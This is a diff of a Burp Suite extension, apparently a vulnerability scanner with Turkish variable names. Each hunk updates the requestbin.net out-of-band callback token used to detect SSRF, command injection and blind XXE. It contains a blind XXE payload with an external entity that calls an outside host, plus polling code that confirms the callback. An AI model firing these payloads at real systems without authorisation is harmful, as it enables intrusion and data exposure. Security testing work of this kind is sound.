@@ -1231,7 +1231,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	
 	
 	anahtar=randomString(19)
-	anahtar_ana=anahtar+".f02c643e187a816fc79d.d.requestbin.net"
+	anahtar_ana=anahtar+".11d2c2799451542304ca.d.requestbin.net"
 	
 	
 	postgetdict={}
@@ -1251,7 +1251,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    postgetdict=params.copy()
 			    data = dump.dump_all(y11)
 			    rawdata = data.decode('utf-8')
-			    bakbak=requests.get("http://requestbin.net/dns?master=f02c643e187a816fc79d").text
+			    bakbak=requests.get("http://requestbin.net/dns?master=11d2c2799451542304ca").text
 			    if anahtar in bakbak:	
 				self.ekle(method,url,"GET SSRF Injection",str(new_param), rawdata)
 				    
@@ -1264,7 +1264,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    postgetdict=params.copy()
 			    data = dump.dump_all(y11)
 			    rawdata = data.decode('utf-8')
-			    bakbak=requests.get("http://requestbin.net/dns?master=f02c643e187a816fc79d").text
+			    bakbak=requests.get("http://requestbin.net/dns?master=11d2c2799451542304ca").text
 			    if anahtar in bakbak:	
 				self.ekle(method,url,"POST SSRF Injection",str(new_param), rawdata)
 
@@ -1281,7 +1281,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	cmdhal={}
 
 	anahtar=randomString(19)
-	anahtar_ana=anahtar+".f02c643e187a816fc79d.d.requestbin.net"
+	anahtar_ana=anahtar+".11d2c2799451542304ca.d.requestbin.net"
 	
 	for sep in seperators:
 	    try:
@@ -1293,7 +1293,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		cmdhal.clear()
 		data = dump.dump_all(urlac)
 		rawdata = data.decode('utf-8')
-		bakbak=requests.get("http://requestbin.net/dns?master=f02c643e187a816fc79d").text
+		bakbak=requests.get("http://requestbin.net/dns?master=11d2c2799451542304ca").text
 		
 		if anahtar in bakbak:
 		    self.ekle("GET",url,"URL SSRF Injection",cmdhal, rawdata)
@@ -2238,7 +2238,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	rastgelekaptan = random.randint(0, 9999997)
 	
 	anahtar=randomString(19)
-	anahtar_ana=anahtar+".f02c643e187a816fc79d.d.requestbin.net"
+	anahtar_ana=anahtar+".11d2c2799451542304ca.d.requestbin.net"
 	
 	
 	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>'
@@ -2263,7 +2263,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    rawdata = data.decode('utf-8')
 		self.hatakontrol("POST", url, response, url)
 
-		bakbak=requests.get("http://requestbin.net/dns?master=f02c643e187a816fc79d").text
+		bakbak=requests.get("http://requestbin.net/dns?master=11d2c2799451542304ca").text
 		if anahtar in bakbak:
 		    self.ekle(method, url, "BLIND XXE Injection", url + "DATA" + inject_key+body, rawdata)
 
